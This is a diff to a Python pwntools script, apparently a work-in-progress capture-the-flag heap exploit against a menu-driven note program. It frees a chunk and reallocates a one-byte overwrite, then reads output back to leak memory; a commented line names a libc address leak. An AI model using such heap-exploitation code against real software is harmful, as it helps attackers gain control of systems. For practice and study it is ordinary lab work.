@@ -2,6 +2,10 @@
 
 from pwn import  *
 
+context.os="linux"
+context.arch="amd64"
+#context.log_level="DEBUG"
+
 def menu():
     global r
     r.recvuntil("choice: ")
@@ -14,16 +18,24 @@ def add(size, c):
     r.sendline(str(size))
     r.sendline(c*size)
 
-def show(num):
+def show(delim):
     menu()
+    data=""
     r.sendline("1")
-    return r.recvlines(num)
+    buf=""
+    while not delim in buf: 
+        buf+=r.recv(1)
+        data+=buf
+    return data
+    
 
 def edit(idx,size,c):
     menu()
     r.sendline("3")
     r.recvuntil("number: ")
     r.sendline(str(idx))
+    r.recvuntil("note: ")
+    r.sendline(c*size)
     r.recvuntil("note: ")
     r.sendline(c*size)
 
@@ -40,11 +52,11 @@ def main():
     add(0x80,"B")
     #add(12,"C")
     delete(0)
-    edit(0,1,"\xb8")
-    data=show(0)
-    print hexdump(data)
+    add(1,"\xb8")
     raw_input("[DEBUG]: {}".format(r.proc.pid))
-
+    data=hexdump(show("1. BBBB"))
+    print hexdump(data)
+ #   log.info("Leak libc @ {}".format(hex(data)))
 
 if __name__=="__main__":
     main()
